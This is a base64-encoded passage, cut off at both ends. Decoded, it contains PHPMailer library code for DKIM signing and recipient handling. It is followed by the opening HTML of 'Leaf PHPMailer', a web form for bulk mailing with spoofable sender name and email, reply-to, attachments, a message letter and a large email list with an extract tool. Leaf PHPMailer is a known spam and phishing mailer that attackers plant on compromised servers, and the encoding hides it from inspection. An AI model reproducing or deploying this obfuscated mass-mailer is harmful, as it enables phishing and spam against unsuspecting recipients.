luZycpIC4gJ29wZW5zc2wnKTsKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gJyc7CiAgICAgICAgfQogICAgICAgICRwcml2S2V5U3RyID0gIWVtcHR5KCR0aGlzLT5ES0lNX3ByaXZhdGVfc3RyaW5nKSA/ICR0aGlzLT5ES0lNX3ByaXZhdGVfc3RyaW5nIDogZmlsZV9nZXRfY29udGVudHMoJHRoaXMtPkRLSU1fcHJpdmF0ZSk7CiAgICAgICAgaWYgKCcnICE9ICR0aGlzLT5ES0lNX3Bhc3NwaHJhc2UpIHsKICAgICAgICAgICAgJHByaXZLZXkgPSBvcGVuc3NsX3BrZXlfZ2V0X3ByaXZhdGUoJHByaXZLZXlTdHIsICR0aGlzLT5ES0lNX3Bhc3NwaHJhc2UpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRwcml2S2V5ID0gb3BlbnNzbF9wa2V5X2dldF9wcml2YXRlKCRwcml2S2V5U3RyKTsKICAgICAgICB9CiAgICAgICAgLy9Xb3JrYXJvdW5kIGZvciBtaXNzaW5nIGRpZ2VzdCBhbGdvcml0aG1zIGluIG9sZCBQSFAgJiBPcGVuU1NMIHZlcnNpb25zCiAgICAgICAgLy9AbGluayBodHRwOi8vc3RhY2tvdmVyZmxvdy5jb20vYS8xMTExNzMzOC8zMzMzNDAKICAgICAgICBpZiAodmVyc2lvbl9jb21wYXJlKFBIUF9WRVJTSU9OLCAnNS4zLjAnKSA+PSAwIGFuZAogICAgICAgICAgICBpbl9hcnJheSgnc2hhMjU2V2l0aFJTQUVuY3J5cHRpb24nLCBvcGVuc3NsX2dldF9tZF9tZXRob2RzKHRydWUpKSkgewogICAgICAgICAgICBpZiAob3BlbnNzbF9zaWduKCRzaWduSGVhZGVyLCAkc2lnbmF0dXJlLCAkcHJpdktleSwgJ3NoYTI1NldpdGhSU0FFbmNyeXB0aW9uJykpIHsKICAgICAgICAgICAgICAgIG9wZW5zc2xfcGtleV9mcmVlKCRwcml2S2V5KTsKICAgICAgICAgICAgICAgIHJldHVybiBiYXNlNjRfZW5jb2RlKCRzaWduYXR1cmUpOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJHBpbmZvID0gb3BlbnNzbF9wa2V5X2dldF9kZXRhaWxzKCRwcml2S2V5KTsKICAgICAgICAgICAgJGhhc2ggPSBoYXNoKCdzaGEyNTYnLCAkc2lnbkhlYWRlcik7CiAgICAgICAgICAgIC8vJ01hZ2ljJyBjb25zdGFudCBmb3IgU0hBMjU2IGZyb20gUkZDMzQ0NwogICAgICAgICAgICAvL0BsaW5rIGh0dHBzOi8vdG9vbHMuaWV0Zi5vcmcvaHRtbC9yZmMzNDQ3I3BhZ2UtNDMKICAgICAgICAgICAgJHQgPSAnMzAzMTMwMGQwNjA5NjA4NjQ4MDE2NTAzMDQwMjAxMDUwMDA0MjAnIC4gJGhhc2g7CiAgICAgICAgICAgICRwc2xlbiA9ICRwaW5mb1snYml0cyddIC8gOCAtIChzdHJsZW4oJHQpIC8gMiArIDMpOwogICAgICAgICAgICAkZWIgPSBwYWNrKCdIKicsICcwMDAxJyAuIHN0cl9yZXBlYXQoJ0ZGJywgJHBzbGVuKSAuICcwMCcgLiAkdCk7CgogICAgICAgICAgICBpZiAob3BlbnNzbF9wcml2YXRlX2VuY3J5cHQoJGViLCAkc2lnbmF0dXJlLCAkcHJpdktleSwgT1BFTlNTTF9OT19QQURESU5HKSkgewogICAgICAgICAgICAgICAgb3BlbnNzbF9wa2V5X2ZyZWUoJHByaXZLZXkpOwogICAgICAgICAgICAgICAgcmV0dXJuIGJhc2U2NF9lbmNvZGUoJHNpZ25hdHVyZSk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgb3BlbnNzbF9wa2V5X2ZyZWUoJHByaXZLZXkpOwogICAgICAgIHJldHVybiAnJzsKICAgIH0KCiAgICAvKioKICAgICAqIEdlbmVyYXRlIGEgREtJTSBjYW5vbmljYWxpemF0aW9uIGhlYWRlci4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzaWduSGVhZGVyIEhlYWRlcgogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIERLSU1fSGVhZGVyQygkc2lnbkhlYWRlcikKICAgIHsKICAgICAgICAkc2lnbkhlYWRlciA9IHByZWdfcmVwbGFjZSgnL1xyXG5ccysvJywgJyAnLCAkc2lnbkhlYWRlcik7CiAgICAgICAgJGxpbmVzID0gZXhwbG9kZSgiXHJcbiIsICRzaWduSGVhZGVyKTsKICAgICAgICBmb3JlYWNoICgkbGluZXMgYXMgJGtleSA9PiAkbGluZSkgewogICAgICAgICAgICBsaXN0KCRoZWFkaW5nLCAkdmFsdWUpID0gZXhwbG9kZSgnOicsICRsaW5lLCAyKTsKICAgICAgICAgICAgJGhlYWRpbmcgPSBzdHJ0b2xvd2VyKCRoZWFkaW5nKTsKICAgICAgICAgICAgJHZhbHVlID0gcHJlZ19yZXBsYWNlKCcvXHN7Mix9LycsICcgJywgJHZhbHVlKTsgLy8gQ29tcHJlc3MgdXNlbGVzcyBzcGFjZXMKICAgICAgICAgICAgJGxpbmVzWyRrZXldID0gJGhlYWRpbmcgLiAnOicgLiB0cmltKCR2YWx1ZSk7IC8vIERvbid0IGZvcmdldCB0byByZW1vdmUgV1NQIGFyb3VuZCB0aGUgdmFsdWUKICAgICAgICB9CiAgICAgICAgJHNpZ25IZWFkZXIgPSBpbXBsb2RlKCJcclxuIiwgJGxpbmVzKTsKICAgICAgICByZXR1cm4gJHNpZ25IZWFkZXI7CiAgICB9CgogICAgLyoqCiAgICAgKiBHZW5lcmF0ZSBhIERLSU0gY2Fub25pY2FsaXphdGlvbiBib2R5LgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEBwYXJhbSBzdHJpbmcgJGJvZHkgTWVzc2FnZSBCb2R5CiAgICAgKiBAcmV0dXJuIHN0cmluZwogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gREtJTV9Cb2R5QygkYm9keSkKICAgIHsKICAgICAgICBpZiAoJGJvZHkgPT0gJycpIHsKICAgICAgICAgICAgcmV0dXJuICJcclxuIjsKICAgICAgICB9CiAgICAgICAgLy8gc3RhYmlsaXplIGxpbmUgZW5kaW5ncwogICAgICAgICRib2R5ID0gc3RyX3JlcGxhY2UoIlxyXG4iLCAiXG4iLCAkYm9keSk7CiAgICAgICAgJGJvZHkgPSBzdHJfcmVwbGFjZSgiXG4iLCAiXHJcbiIsICRib2R5KTsKICAgICAgICAvLyBFTkQgc3RhYmlsaXplIGxpbmUgZW5kaW5ncwogICAgICAgIHdoaWxlIChzdWJzdHIoJGJvZHksIHN0cmxlbigkYm9keSkgLSA0LCA0KSA9PSAiXHJcblxyXG4iKSB7CiAgICAgICAgICAgICRib2R5ID0gc3Vic3RyKCRib2R5LCAwLCBzdHJsZW4oJGJvZHkpIC0gMik7CiAgICAgICAgfQogICAgICAgIHJldHVybiAkYm9keTsKICAgIH0KCiAgICAvKioKICAgICAqIENyZWF0ZSB0aGUgREtJTSBoZWFkZXIgYW5kIGJvZHkgaW4gYSBuZXcgbWVzc2FnZSBoZWFkZXIuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHBhcmFtIHN0cmluZyAkaGVhZGVyc19saW5lIEhlYWRlciBsaW5lcwogICAgICogQHBhcmFtIHN0cmluZyAkc3ViamVjdCBTdWJqZWN0CiAgICAgKiBAcGFyYW0gc3RyaW5nICRib2R5IEJvZHkKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBES0lNX0FkZCgkaGVhZGVyc19saW5lLCAkc3ViamVjdCwgJGJvZHkpCiAgICB7CiAgICAgICAgJERLSU1zaWduYXR1cmVUeXBlID0gJ3JzYS1zaGEyNTYnOyAvLyBTaWduYXR1cmUgJiBoYXNoIGFsZ29yaXRobXMKICAgICAgICAkREtJTWNhbm9uaWNhbGl6YXRpb24gPSAncmVsYXhlZC9zaW1wbGUnOyAvLyBDYW5vbmljYWxpemF0aW9uIG9mIGhlYWRlci9ib2R5CiAgICAgICAgJERLSU1xdWVyeSA9ICdkbnMvdHh0JzsgLy8gUXVlcnkgbWV0aG9kCiAgICAgICAgJERLSU10aW1lID0gdGltZSgpOyAvLyBTaWduYXR1cmUgVGltZXN0YW1wID0gc2Vjb25kcyBzaW5jZSAwMDowMDowMCAtIEphbiAxLCAxOTcwIChVVEMgdGltZSB6b25lKQogICAgICAgICRzdWJqZWN0X2hlYWRlciA9ICJTdWJqZWN0OiAkc3ViamVjdCI7CiAgICAgICAgJGhlYWRlcnMgPSBleHBsb2RlKCR0aGlzLT5MRSwgJGhlYWRlcnNfbGluZSk7CiAgICAgICAgJGZyb21faGVhZGVyID0gJyc7CiAgICAgICAgJHRvX2hlYWRlciA9ICcnOwogICAgICAgICRkYXRlX2hlYWRlciA9ICcnOwogICAgICAgICRjdXJyZW50ID0gJyc7CiAgICAgICAgZm9yZWFjaCAoJGhlYWRlcnMgYXMgJGhlYWRlcikgewogICAgICAgICAgICBpZiAoc3RycG9zKCRoZWFkZXIsICdGcm9tOicpID09PSAwKSB7CiAgICAgICAgICAgICAgICAkZnJvbV9oZWFkZXIgPSAkaGVhZGVyOwogICAgICAgICAgICAgICAgJGN1cnJlbnQgPSAnZnJvbV9oZWFkZXInOwogICAgICAgICAgICB9IGVsc2VpZiAoc3RycG9zKCRoZWFkZXIsICdUbzonKSA9PT0gMCkgewogICAgICAgICAgICAgICAgJHRvX2hlYWRlciA9ICRoZWFkZXI7CiAgICAgICAgICAgICAgICAkY3VycmVudCA9ICd0b19oZWFkZXInOwogICAgICAgICAgICB9IGVsc2VpZiAoc3RycG9zKCRoZWFkZXIsICdEYXRlOicpID09PSAwKSB7CiAgICAgICAgICAgICAgICAkZGF0ZV9oZWFkZXIgPSAkaGVhZGVyOwogICAgICAgICAgICAgICAgJGN1cnJlbnQgPSAnZGF0ZV9oZWFkZXInOwogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkJGN1cnJlbnQpICYmIHN0cnBvcygkaGVhZGVyLCAnID0/JykgPT09IDApIHsKICAgICAgICAgICAgICAgICAgICAkJGN1cnJlbnQgLj0gJGhlYWRlcjsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJGN1cnJlbnQgPSAnJzsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkZnJvbSA9IHN0cl9yZXBsYWNlKCd8JywgJz03QycsICR0aGlzLT5ES0lNX1FQKCRmcm9tX2hlYWRlcikpOwogICAgICAgICR0byA9IHN0cl9yZXBsYWNlKCd8JywgJz03QycsICR0aGlzLT5ES0lNX1FQKCR0b19oZWFkZXIpKTsKICAgICAgICAkZGF0ZSA9IHN0cl9yZXBsYWNlKCd8JywgJz03QycsICR0aGlzLT5ES0lNX1FQKCRkYXRlX2hlYWRlcikpOwogICAgICAgICRzdWJqZWN0ID0gc3RyX3JlcGxhY2UoCiAgICAgICAgICAgICd8JywKICAgICAgICAgICAgJz03QycsCiAgICAgICAgICAgICR0aGlzLT5ES0lNX1FQKCRzdWJqZWN0X2hlYWRlcikKICAgICAgICApOyAvLyBDb3BpZWQgaGVhZGVyIGZpZWxkcyAoZGtpbS1xdW90ZWQtcHJpbnRhYmxlKQogICAgICAgICRib2R5ID0gJHRoaXMtPkRLSU1fQm9keUMoJGJvZHkpOwogICAgICAgICRES0lNbGVuID0gc3RybGVuKCRib2R5KTsgLy8gTGVuZ3RoIG9mIGJvZHkKICAgICAgICAkREtJTWI2NCA9IGJhc2U2NF9lbmNvZGUocGFjaygnSConLCBoYXNoKCdzaGEyNTYnLCAkYm9keSkpKTsgLy8gQmFzZTY0IG9mIHBhY2tlZCBiaW5hcnkgU0hBLTI1NiBoYXNoIG9mIGJvZHkKICAgICAgICBpZiAoJycgPT0gJHRoaXMtPkRLSU1faWRlbnRpdHkpIHsKICAgICAgICAgICAgJGlkZW50ID0gJyc7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJGlkZW50ID0gJyBpPScgLiAkdGhpcy0+REtJTV9pZGVudGl0eSAuICc7JzsKICAgICAgICB9CiAgICAgICAgJGRraW1oZHJzID0gJ0RLSU0tU2lnbmF0dXJlOiB2PTE7IGE9JyAuCiAgICAgICAgICAgICRES0lNc2lnbmF0dXJlVHlwZSAuICc7IHE9JyAuCiAgICAgICAgICAgICRES0lNcXVlcnkgLiAnOyBsPScgLgogICAgICAgICAgICAkREtJTWxlbiAuICc7IHM9JyAuCiAgICAgICAgICAgICR0aGlzLT5ES0lNX3NlbGVjdG9yIC4KICAgICAgICAgICAgIjtcclxuIiAuCiAgICAgICAgICAgICJcdHQ9IiAuICRES0lNdGltZSAuICc7IGM9JyAuICRES0lNY2Fub25pY2FsaXphdGlvbiAuICI7XHJcbiIgLgogICAgICAgICAgICAiXHRoPUZyb206VG86RGF0ZTpTdWJqZWN0O1xyXG4iIC4KICAgICAgICAgICAgIlx0ZD0iIC4gJHRoaXMtPkRLSU1fZG9tYWluIC4gJzsnIC4gJGlkZW50IC4gIlxyXG4iIC4KICAgICAgICAgICAgIlx0ej0kZnJvbVxyXG4iIC4KICAgICAgICAgICAgIlx0fCR0b1xyXG4iIC4KICAgICAgICAgICAgIlx0fCRkYXRlXHJcbiIgLgogICAgICAgICAgICAiXHR8JHN1YmplY3Q7XHJcbiIgLgogICAgICAgICAgICAiXHRiaD0iIC4gJERLSU1iNjQgLiAiO1xyXG4iIC4KICAgICAgICAgICAgIlx0Yj0iOwogICAgICAgICR0b1NpZ24gPSAkdGhpcy0+REtJTV9IZWFkZXJDKAogICAgICAgICAgICAkZnJvbV9oZWFkZXIgLiAiXHJcbiIgLgogICAgICAgICAgICAkdG9faGVhZGVyIC4gIlxyXG4iIC4KICAgICAgICAgICAgJGRhdGVfaGVhZGVyIC4gIlxyXG4iIC4KICAgICAgICAgICAgJHN1YmplY3RfaGVhZGVyIC4gIlxyXG4iIC4KICAgICAgICAgICAgJGRraW1oZHJzCiAgICAgICAgKTsKICAgICAgICAkc2lnbmVkID0gJHRoaXMtPkRLSU1fU2lnbigkdG9TaWduKTsKICAgICAgICByZXR1cm4gJGRraW1oZHJzIC4gJHNpZ25lZCAuICJcclxuIjsKICAgIH0KCiAgICAvKioKICAgICAqIERldGVjdCBpZiBhIHN0cmluZyBjb250YWlucyBhIGxpbmUgbG9uZ2VyIHRoYW4gdGhlIG1heGltdW0gbGluZSBsZW5ndGggYWxsb3dlZC4KICAgICAqIEBwYXJhbSBzdHJpbmcgJHN0cgogICAgICogQHJldHVybiBib29sZWFuCiAgICAgKiBAc3RhdGljCiAgICAgKi8KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gaGFzTGluZUxvbmdlclRoYW5NYXgoJHN0cikKICAgIHsKICAgICAgICAvLysyIHRvIGluY2x1ZGUgQ1JMRiBsaW5lIGJyZWFrIGZvciBhIDEwMDAgdG90YWwKICAgICAgICByZXR1cm4gKGJvb2xlYW4pcHJlZ19tYXRjaCgnL14oLnsnLihzZWxmOjpNQVhfTElORV9MRU5HVEggKyAyKS4nLH0pL20nLCAkc3RyKTsKICAgIH0KCiAgICAvKioKICAgICAqIEFsbG93cyBmb3IgcHVibGljIHJlYWQgYWNjZXNzIHRvICd0bycgcHJvcGVydHkuCiAgICAgKiBAbm90ZTogQmVmb3JlIHRoZSBzZW5kKCkgY2FsbCwgcXVldWVkIGFkZHJlc3NlcyAoaS5lLiB3aXRoIElETikgYXJlIG5vdCB5ZXQgaW5jbHVkZWQuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0VG9BZGRyZXNzZXMoKQogICAgewogICAgICAgIHJldHVybiAkdGhpcy0+dG87CiAgICB9CgogICAgLyoqCiAgICAgKiBBbGxvd3MgZm9yIHB1YmxpYyByZWFkIGFjY2VzcyB0byAnY2MnIHByb3BlcnR5LgogICAgICogQG5vdGU6IEJlZm9yZSB0aGUgc2VuZCgpIGNhbGwsIHF1ZXVlZCBhZGRyZXNzZXMgKGkuZS4gd2l0aCBJRE4pIGFyZSBub3QgeWV0IGluY2x1ZGVkLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEByZXR1cm4gYXJyYXkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldENjQWRkcmVzc2VzKCkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmNjOwogICAgfQoKICAgIC8qKgogICAgICogQWxsb3dzIGZvciBwdWJsaWMgcmVhZCBhY2Nlc3MgdG8gJ2JjYycgcHJvcGVydHkuCiAgICAgKiBAbm90ZTogQmVmb3JlIHRoZSBzZW5kKCkgY2FsbCwgcXVldWVkIGFkZHJlc3NlcyAoaS5lLiB3aXRoIElETikgYXJlIG5vdCB5ZXQgaW5jbHVkZWQuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBhcnJheQogICAgICovCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0QmNjQWRkcmVzc2VzKCkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPmJjYzsKICAgIH0KCiAgICAvKioKICAgICAqIEFsbG93cyBmb3IgcHVibGljIHJlYWQgYWNjZXNzIHRvICdSZXBseVRvJyBwcm9wZXJ0eS4KICAgICAqIEBub3RlOiBCZWZvcmUgdGhlIHNlbmQoKSBjYWxsLCBxdWV1ZWQgYWRkcmVzc2VzIChpLmUuIHdpdGggSUROKSBhcmUgbm90IHlldCBpbmNsdWRlZC4KICAgICAqIEBhY2Nlc3MgcHVibGljCiAgICAgKiBAcmV0dXJuIGFycmF5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRSZXBseVRvQWRkcmVzc2VzKCkKICAgIHsKICAgICAgICByZXR1cm4gJHRoaXMtPlJlcGx5VG87CiAgICB9CgogICAgLyoqCiAgICAgKiBBbGxvd3MgZm9yIHB1YmxpYyByZWFkIGFjY2VzcyB0byAnYWxsX3JlY2lwaWVudHMnIHByb3BlcnR5LgogICAgICogQG5vdGU6IEJlZm9yZSB0aGUgc2VuZCgpIGNhbGwsIHF1ZXVlZCBhZGRyZXNzZXMgKGkuZS4gd2l0aCBJRE4pIGFyZSBub3QgeWV0IGluY2x1ZGVkLgogICAgICogQGFjY2VzcyBwdWJsaWMKICAgICAqIEByZXR1cm4gYXJyYXkKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldEFsbFJlY2lwaWVudEFkZHJlc3NlcygpCiAgICB7CiAgICAgICAgcmV0dXJuICR0aGlzLT5hbGxfcmVjaXBpZW50czsKICAgIH0KCiAgICAvKioKICAgICAqIFBlcmZvcm0gYSBjYWxsYmFjay4KICAgICAqIEBwYXJhbSBib29sZWFuICRpc1NlbnQKICAgICAqIEBwYXJhbSBhcnJheSAkdG8KICAgICAqIEBwYXJhbSBhcnJheSAkY2MKICAgICAqIEBwYXJhbSBhcnJheSAkYmNjCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdWJqZWN0CiAgICAgKiBAcGFyYW0gc3RyaW5nICRib2R5CiAgICAgKiBAcGFyYW0gc3RyaW5nICRmcm9tCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBkb0NhbGxiYWNrKCRpc1NlbnQsICR0bywgJGNjLCAkYmNjLCAkc3ViamVjdCwgJGJvZHksICRmcm9tKQogICAgewogICAgICAgIGlmICghZW1wdHkoJHRoaXMtPmFjdGlvbl9mdW5jdGlvbikgJiYgaXNfY2FsbGFibGUoJHRoaXMtPmFjdGlvbl9mdW5jdGlvbikpIHsKICAgICAgICAgICAgJHBhcmFtcyA9IGFycmF5KCRpc1NlbnQsICR0bywgJGNjLCAkYmNjLCAkc3ViamVjdCwgJGJvZHksICRmcm9tKTsKICAgICAgICAgICAgY2FsbF91c2VyX2Z1bmNfYXJyYXkoJHRoaXMtPmFjdGlvbl9mdW5jdGlvbiwgJHBhcmFtcyk7CiAgICAgICAgfQogICAgfQp9CgovKioKICogUEhQTWFpbGVyIGV4Y2VwdGlvbiBoYW5kbGVyCiAqIEBwYWNrYWdlIFBIUE1haWxlcgogKi8KY2xhc3MgcGhwbWFpbGVyRXhjZXB0aW9uIGV4dGVuZHMgRXhjZXB0aW9uCnsKICAgIC8qKgogICAgICogUHJldHRpZnkgZXJyb3IgbWVzc2FnZSBvdXRwdXQKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBlcnJvck1lc3NhZ2UoKQogICAgewogICAgICAgICRlcnJvck1zZyA9ICc8c3Ryb25nPicgLiBodG1sc3BlY2lhbGNoYXJzKCR0aGlzLT5nZXRNZXNzYWdlKCkpIC4gIjwvc3Ryb25nPjxiciAvPlxuIjsKICAgICAgICByZXR1cm4gJGVycm9yTXNnOwogICAgfQp9CmZ1bmN0aW9uIGxlYWZoZWFkZXIoKXsKcHJpbnQgJwo8aGVhZD4KICAgIDx0aXRsZT4nLnN0cl9yZXBsYWNlKCJ3d3cuIiwgIiIsICRfU0VSVkVSWydIVFRQX0hPU1QnXSkuJyAtIExlYWYgUEhQTWFpbGVyPC90aXRsZT4KICAgIDxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04Ii8+CiAgICA8bGluayBocmVmPSJodHRwczovL21heGNkbi5ib290c3RyYXBjZG4uY29tL2Jvb3Rzd2F0Y2gvMy40LjEvY29zbW8vYm9vdHN0cmFwLm1pbi5jc3MiIHJlbD0ic3R5bGVzaGVldCIgPgoKPC9oZWFkPic7Cn0KbGVhZmhlYWRlcigpOwpwcmludCAnPGJvZHk+JzsKcHJpbnQgJzxkaXYgY2xhc3M9ImNvbnRhaW5lciBjb2wtbGctNiI+CiAgICAgICAgPGgzPjxmb250IGNvbG9yPSJncmVlbiI+PHNwYW4gY2xhc3M9ImdseXBoaWNvbiBnbHlwaGljb24tbGVhZiI+PC9zcGFuPjwvZm9udD4gTGVhZiBQSFBNYWlsZXIgPHNtYWxsPicuJGxlYWZbJ3ZlcnNpb24nXS4nPC9zbWFsbD48L2gzPgogICAgICAgIDxmb3JtIG5hbWU9ImZvcm0iIGlkPSJmb3JtIiBtZXRob2Q9IlBPU1QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIGFjdGlvbj0iIj4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhY3Rpb24iIHZhbHVlPSJzY29yZSI+CgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbGctNiAiPjxsYWJlbCBmb3I9InNlbmRlckVtYWlsIj5FbWFpbDwvbGFiZWw+PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wgIGlucHV0LXNtICIgaWQ9InNlbmRlckVtYWlsIiBuYW1lPSJzZW5kZXJFbWFpbCIgdmFsdWU9IicuJHNlbmRlckVtYWlsLiciPjwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbGctNiAiPjxsYWJlbCBmb3I9InNlbmRlck5hbWUiPlNlbmRlciBOYW1lPC9sYWJlbD48aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCAgaW5wdXQtc20gIiBpZD0ic2VuZGVyTmFtZSIgbmFtZT0ic2VuZGVyTmFtZSIgdmFsdWU9IicuJHNlbmRlck5hbWUuJyI+PC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgICAgICAgICAgPHNwYW4gY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTYgICI+PGxhYmVsIGZvcj0iYXR0YWNobWVudCI+QXR0YWNobWVudCA8c21hbGw+KE11bHRpcGxlIEF2YWlsYWJsZSk8L3NtYWxsPjwvbGFiZWw+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImF0dGFjaG1lbnRbXSIgaWQ9ImF0dGFjaG1lbnRbXSIgbXVsdGlwbGUvPjwvc3Bhbj4KCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGNvbC1sZy02Ij48bGFiZWwgZm9yPSJyZXBseVRvIj5SZXBseS10bzwvbGFiZWw+PGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJmb3JtLWNvbnRyb2wgIGlucHV0LXNtICIgaWQ9InJlcGx5VG8iIG5hbWU9InJlcGx5VG8iIHZhbHVlPSInLiRyZXBseVRvLiciIC8+PC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCBjb2wtbGctMTIgIj48bGFiZWwgZm9yPSJzdWJqZWN0Ij5TdWJqZWN0PC9sYWJlbD48aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCAgaW5wdXQtc20gIiBpZD0ic3ViamVjdCIgbmFtZT0ic3ViamVjdCIgdmFsdWU9IicuJHN1YmplY3QuJyIgLz48L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9InJvdyI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmb3JtLWdyb3VwIGNvbC1sZy02Ij48bGFiZWwgZm9yPSJtZXNzYWdlTGV0dGVyIj5NZXNzYWdlIExldHRlciA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tZGVmYXVsdCBidG4teHMiIGZvcm09ImZvcm0iIG5hbWU9ImFjdGlvbiIgdmFsdWU9InZpZXciIGZvcm10YXJnZXQ9Il9ibGFuayI+UHJldmlldyA8L2J1dHRvbj48L2xhYmVsPjx0ZXh0YXJlYSBuYW1lPSJtZXNzYWdlTGV0dGVyIiBpZD0ibWVzc2FnZUxldHRlciIgY2xhc3M9ImZvcm0tY29udHJvbCIgcm93cz0iMTAiIGlkPSJ0ZXh0QXJlYSI+Jy4kbWVzc2FnZUxldHRlci4nPC90ZXh0YXJlYT48L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTYgIj48bGFiZWwgZm9yPSJlbWFpbExpc3QiPkVtYWlsIExpc3QgPGEgaHJlZj0iP2VtYWlsZmlsdGVyPW9uIiB0YXJnZXQ9Il9ibGFuayIgY2xhc3M9ImJ0biBidG4tZGVmYXVsdCBidG4teHMiPkZpbHRlci9FeHRyYWN0PC9hPjwvbGFiZWw+PHRleHRhcmVhIG5hbWU9ImVtYWlsTGlzdCIgaWQ9ImVtYWlsTGlzdCIgY2xhc3M9ImZvcm0tY29udHJvbCIgcm93cz0iMTAiIGlkPSJ0ZXh0QXJlYSI+Jy4kZW1haWxMaXN0Lic8L3RleHRhcmVhPjwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTYgIj4KICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJtZXNzYWdlVHlwZSI+TWVzc2FnZSBUeXBlPC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICBIVE1MIDxpbnB1dCB0eXBlPSJyYWRpbyIgbmFtZT0ibWVzc2FnZVR5cGUiIGlkPSJtZXNzYWdlVHlwZSIgdmFsdWU9IjEiICcuJGh0bWwuJz4KICAgICAgICAgICAgICAgICAgICBQbGFpbjxpbnB1dCB0eXBlPSJyYWRpbyIgbmFtZT0ibWVzc2FnZVR5cGUiIGlkPSJtZXNzYWdlVHlwZSIgdmFsdWU9IjIiICcuJHBsYWluLic+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTMgIj4KICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJjaGFyc2V0Ij5DaGFyYWN0ZXIgc2V0PC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICA8c2VsZWN0IGNsYXNzPSJmb3JtLWNvbnRyb2wgaW5wdXQtc20iIGlkPSJjaGFyc2V0IiBuYW1lPSJjaGFyc2V0Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiAnLiR1dGY4Lic+VVRGLTg8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiAnLiRpc28uJz5JU08tODg1OS0xPC9vcHRpb24+CiAgICAgICAgICAgICAgICAgICAgPC9zZWxlY3Q+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgY29sLWxnLTMgIj4KICAgICAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJlbmNvZGluZyI+TWVzc2FnZSBlbmNvZGluZzwvbG